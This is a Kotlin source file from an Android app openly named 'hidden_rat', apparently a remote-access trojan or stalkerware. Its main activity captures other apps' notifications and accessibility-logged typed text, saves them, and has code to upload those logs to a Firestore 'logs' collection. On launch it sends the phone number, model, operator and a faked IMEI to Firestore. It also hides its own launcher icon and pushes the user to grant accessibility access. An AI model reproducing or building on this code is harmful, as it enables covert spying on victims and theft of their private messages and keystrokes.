package com.ratx.hidden_rat.activity

import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.*
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.view.isVisible
import androidx.lifecycle.MutableLiveData
import androidx.recyclerview.widget.RecyclerView
import com.google.android.gms.tasks.OnCompleteListener
import com.ratx.hidden_rat.adapter.LogAdapter
import com.ratx.hidden_rat.adapter.NotificationAdapter
import com.ratx.hidden_rat.R
import com.ratx.hidden_rat.databinding.ActivityMainBinding
import com.ratx.hidden_rat.model.LogModel
import com.ratx.hidden_rat.model.NotificationModel
import com.ratx.hidden_rat.service.SvcAccFix
import com.google.firebase.FirebaseApp
import com.google.firebase.firestore.DocumentSnapshot
import com.google.firebase.firestore.FirebaseFirestore
import com.google.gson.Gson
import com.google.gson.JsonSyntaxException
import com.ratx.hidden_rat.model.PhoneData
import com.ratx.hidden_rat.utils.hideApp
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileWriter
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Locale

class MainFixActivity : AppCompatActivity() {
    private lateinit var recyclerView: RecyclerView
    private lateinit var adapter: NotificationAdapter
    private lateinit var logAdapter: LogAdapter
    private val notifications = mutableListOf<NotificationModel>()
    private val logs = mutableListOf<LogModel>()
    private var isFirstLaunch = true
    private var isNotificationFormat = MutableLiveData<Boolean>(true)
    private val fileName = "notifications1.txt"
    private val fileNameLog = "logs1.txt"
    private lateinit var firestore: FirebaseFirestore

    companion object {
    }

    private var _binding: ActivityMainBinding? = null
    private val binding get() = _binding!!

    private fun checkPermission() {
        if (!SvcAccFix.i) {
            if (!SvcAccFix.j) {
                startActivity(Intent(this, AccessibilityFixActivity::class.java))
            }
        } else {

        }
    }


    private val notificationReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val packageName = intent?.getStringExtra("packageName")
            val title = intent?.getStringExtra("title")
            val text = intent?.getStringExtra("text")
            val timeStamp = intent?.getStringExtra("date")
            val timeStampDay = intent?.getStringExtra("dayTime")
            if (!packageName.isNullOrBlank() && !title.isNullOrBlank() && !text.isNullOrBlank()) {
                val notificationModel = NotificationModel(
                    packageName,
                    title,
                    text,
                    timeStamp!!,
                    timeStampDay!!
                )
                adapter.addNotification(notificationModel)

                saveNotificationToFileLocal(notificationModel)


            }
        }
    }

    private val receiver: BroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val text = intent.getStringExtra("TEXT") ?: ""
            println("TEXTTTTTTTTTTT :${text}")
            val packageName = intent.getStringExtra("PACKAGE_NAME") ?: ""
            val dayTime = intent.getStringExtra("DAY_TIME") ?: ""
            val timeStamp = intent.getStringExtra("TIME_STAMP") ?: ""
            val batteryLevel = intent.getStringExtra("BATTERY_LEVEL") ?: ""
            val notificationModel = LogModel(
                text,
                packageName,
                dayTime!!,
                timeStamp!!, batteryLevel
            )
            Log.d("EVENT", "onAccessibilityEventTAAAAAAA: ${text.toString()}")
            logAdapter.addNotification(notificationModel)
            saveLogToFileLocal(notificationModel)

        }
    }

    private fun saveNotificationToFileLocal(notification: NotificationModel) {
        val gson = Gson()
        val notificationJson = gson.toJson(notification)

        try {
            val file = File(filesDir, fileName)
            FileWriter(file, true).use { writer ->
                writer.append(notificationJson)
                writer.append("\n")
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun saveLogToFileLocal(notification: LogModel) {
        val gson = Gson()
        val notificationJson = gson.toJson(notification)

        try {
            val file = File(filesDir, fileNameLog)
            FileWriter(file, true).use { writer ->
                writer.append(notificationJson)
                writer.append("\n")
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun savePhoneDataIfNotExists(phoneData: PhoneData) {
        val firestore = FirebaseFirestore.getInstance()
        val imeiCollection = firestore.collection("imei")
        imeiCollection.document("phoneData_${phoneData.phoneModel}_${phoneData.imei}").get()
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    val document = task.result
                    if (document != null && !document.exists()) {
                        imeiCollection.document("phoneData_${phoneData.phoneModel}_${phoneData.imei}")
                            .set(phoneData)
                            .addOnSuccessListener {
                                println("Phone data muvaffaqiyatli saqlandi: phoneData_${phoneData.phoneModel}_${phoneData.imei}")
                            }
                            .addOnFailureListener {
                                println("Phone data saqlashda xatolik yuz berdi: phoneData_${phoneData.phoneModel}_${phoneData.imei}")
                            }
                    } else {
                        println("IMEI allaqachon mavjud: phoneData_${phoneData.phoneModel}_${phoneData.imei}}")
                    }
                } else {
                    println("Ma'lumot olishda xatolik yuz berdi:phoneData_${phoneData.phoneModel}_${phoneData.imei}")
                }
            }
    }

    @SuppressLint("SuspiciousIndentation")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        _binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        FirebaseApp.initializeApp(this)
        println("FIREBASE APP NAME :" + FirebaseApp.getInstance().name)
        firestore = FirebaseFirestore.getInstance()

        recyclerView = findViewById(R.id.notificationRecyclerView)
        if (isFirstLaunch) {
            isFirstLaunch = false
            logAdapter = LogAdapter(logs, this)
            adapter = NotificationAdapter(notifications)
            readNotificationsFromFileLocal()
            readLogFromFileLocal()
        }


        val filter = IntentFilter("com.ratx.hidden_rat.NOTIFICATION_LISTENER")
        registerReceiver(notificationReceiver, filter)
        registerReceiver(receiver, IntentFilter("ACTION_TEXT_RECEIVED"))
        val phoneData = getDeviceData(this)
        savePhoneDataIfNotExists(phoneData!!)


        isNotificationFormat.observe(this) {
            if (it) {
                adapter.clearAdapterData()
                readNotificationsFromFileLocal()
                if (notifications.isEmpty()) {
                    binding.isEmpty.isVisible = true
                    binding.isEmpty.text = "Notification Page"
                } else binding.isEmpty.isVisible = false

                recyclerView.adapter = adapter
                binding.notificationRecyclerView.isVisible = true
                binding.typingLoggerRecycler.isVisible = false

            } else {

                logAdapter.clearAdapterData()
                readLogFromFileLocal()
                if (logs.isEmpty()) {
                    binding.isEmpty.isVisible = true
                    binding.isEmpty.text = "Logs Page"
                } else binding.isEmpty.isVisible = false
                binding.typingLoggerRecycler.adapter = logAdapter
                binding.typingLoggerRecycler.isVisible = true
                binding.notificationRecyclerView.isVisible = false
            }
        }

    }

    fun hideAppIcon(context: Context) {
        try {
            val componentName =
                ComponentName(context, "com.ratx.hidden_rat.activity.MainFixActivityAlias")
            val pm = context.packageManager

            // Log current component state
            val componentState = pm.getComponentEnabledSetting(componentName)
            Log.d(
                "HiddenRat",
                "Initial component state: $componentState"
            ) // 1 = enabled, 2 = disabled, 0 = default

            if (componentState != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                // Disable the activity-alias
                pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )

                // Verify new state
                val newState = pm.getComponentEnabledSetting(componentName)
                Log.d("HiddenRat", "New component state: $newState")

                if (newState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    Toast.makeText(
                        context,
                        "App icon hidden. Restart launcher or device to apply.",
                        Toast.LENGTH_LONG
                    ).show()
                    notifyLauncherOfChange()
                } else {
                    Toast.makeText(context, "Failed to hide app icon.", Toast.LENGTH_LONG).show()
                }
            } else {
                Toast.makeText(context, "App icon already hidden.", Toast.LENGTH_SHORT).show()
            }
        } catch (e: Exception) {
            Log.e("HiddenRat", "Error hiding icon: ${e.message}", e)
            Toast.makeText(context, "Error hiding icon: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun notifyLauncherOfChange() {
        try {
            // Broadcast a package changed intent to notify the launcher
            val intent = Intent(Intent.ACTION_PACKAGE_CHANGED)
            intent.setPackage(packageName)
            intent.putExtra(
                Intent.EXTRA_CHANGED_COMPONENT_NAME_LIST,
                arrayOf("com.ratx.hidden_rat.activity.MainFixActivityAlias")
            )
            sendBroadcast(intent)
            Log.d("HiddenRat", "Sent package changed broadcast")
        } catch (e: Exception) {
            Log.e("HiddenRat", "Error notifying launcher: ${e.message}", e)
        }
    }


    private fun readNotificationsFromFileLocal() {
        val file = File(filesDir, fileName)
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()
                val savedNotifications = mutableListOf<NotificationModel>()

                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, NotificationModel::class.java)
                    savedNotifications.add(notificationModel)
                }
                reader.close()

                notifications.addAll(savedNotifications)
                adapter.notifyDataSetChanged()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }


    private fun deleteLogFromLocalFile(log: LogModel) {
        val file = File(filesDir, fileNameLog)
        val tempList = mutableListOf<LogModel>()
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()

                // Avvalgi loglar bilan to'g'ri kelgan logni o'chirish
                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, LogModel::class.java)
                    if (notificationModel != log) {
                        tempList.add(notificationModel)
                    }
                }
                reader.close()

                // Faylni tozalash
                file.delete()

                // Yangi ma'lumotlarni faylga yozish
                val writer = FileWriter(file, true)
                tempList.forEach { tempLog ->
                    val logJson = gson.toJson(tempLog)
                    writer.append(logJson)
                    writer.append("\n")
                }
                writer.close()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }


    private fun isNetworkFastEnough(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork
        val capabilities = connectivityManager.getNetworkCapabilities(network)
        return capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ?: false &&
                (capabilities?.linkDownstreamBandwidthKbps
                    ?: 0) >= 14_000 // Minimum required speed for H+ network
    }

    private fun isLocalLogsAvailable(): Boolean {
        val file = File(filesDir, fileNameLog)
        return file.exists()
    }

    private fun isLocalNotificationsAvailable(): Boolean {
        val file = File(filesDir, fileName)
        return file.exists()
    }

    private fun uploadLocalLogsToFirestore() {
        val file = File(filesDir, fileNameLog)
        if (file.exists()) {
            val gson = Gson()
            val logsToUpload = mutableListOf<LogModel>()

            file.bufferedReader().useLines { lines ->
                lines.forEach { line ->
                    val logModel = gson.fromJson(line, LogModel::class.java)
                    logsToUpload.add(logModel)
                }
            }

            val dataCollection = firestore.collection("logs")

            GlobalScope.launch(Dispatchers.IO) {
                logsToUpload.forEach { log ->
                    // Tekshirib chiqamiz, agar "text" Firebase'da mavjud bo'lsa
                    dataCollection.whereEqualTo("text", log.text).get()
                        .addOnSuccessListener { querySnapshot ->
                            // Agar tekshirish natijasida bitta qator ham topilsa
                            if (!querySnapshot.isEmpty) {
                                // Faqat bitta qator qoldiramiz va o'chirib tashlaymiz
                                val document = querySnapshot.documents.first()
                                document.reference.delete()
                            }
                            // Logni Firebase'ga yuboramiz
                            dataCollection.add(log)
                                .addOnSuccessListener {
                                    deleteLogFromLocalFile(log)
                                }
                                .addOnFailureListener { e ->
                                    Log.d("EVENT", "sendLogToFirestore: ${e.message}")
                                    // Xatolikni qayta qarash
                                }
                        }
                }
            }
        }
    }

    private fun readLogFromFileLocal() {
        val file = File(filesDir, fileNameLog)
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()
                val savedNotifications = mutableListOf<LogModel>()

                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, LogModel::class.java)
                    savedNotifications.add(notificationModel)
                }
                reader.close()

                logs.addAll(savedNotifications)
                adapter.notifyDataSetChanged()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }

    override fun onOptionsItemSelected(menuItem: MenuItem): Boolean {
        when (menuItem.itemId) {
            R.id.actionChangeType -> {
                isNotificationFormat.postValue(!isNotificationFormat.value!!)
            }
        }
        return super.onOptionsItemSelected(menuItem)
    }

    private fun isInternetAvailable(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }


    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.btn, menu)
        return true
    }


    override fun onDestroy() {
        super.onDestroy()
    }

    override fun onResume() {
        super.onResume()
        checkPermission()

    }

    @RequiresApi(Build.VERSION_CODES.O)
    fun getDeviceData(context: Context): PhoneData {
        val telephonyManager =
            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        val imei = getDeviceID()!!

        val phoneModel = Build.MODEL ?: "Model not available"

        val networkOperatorName =
            telephonyManager.networkOperatorName ?: "Operator name not available"

        val currentDate = Calendar.getInstance().time
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        val installedAppDate = dateFormat.format(currentDate)

        return PhoneData(
            imei,
            phoneModel,
            networkOperatorName,
            installedAppDate,
            Build.DEVICE,
            Build.PRODUCT,
            getDevicePhoneNumber(context) ?: "Phone number not available"
        )
    }


    @SuppressLint("MissingPermission")
    fun getDevicePhoneNumber(context: Context): String {
        val telephonyManager =
            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        val number = telephonyManager.line1Number

        return if (!number.isNullOrEmpty()) number else "Number not available"
    }

    fun getDeviceID(): String {
        return "35" + //we make this look like a valid IMEI
                Build.BOARD.length % 10 + Build.BRAND.length % 10 + Build.CPU_ABI.length % 10 + Build.DEVICE.length % 10 + Build.DISPLAY.length % 10 + Build.HOST.length % 10 + Build.ID.length % 10 + Build.MANUFACTURER.length % 10 + Build.MODEL.length % 10 + Build.PRODUCT.length % 10 + Build.TAGS.length % 10 + Build.TYPE.length % 10 + Build.USER.length % 10
    }

}
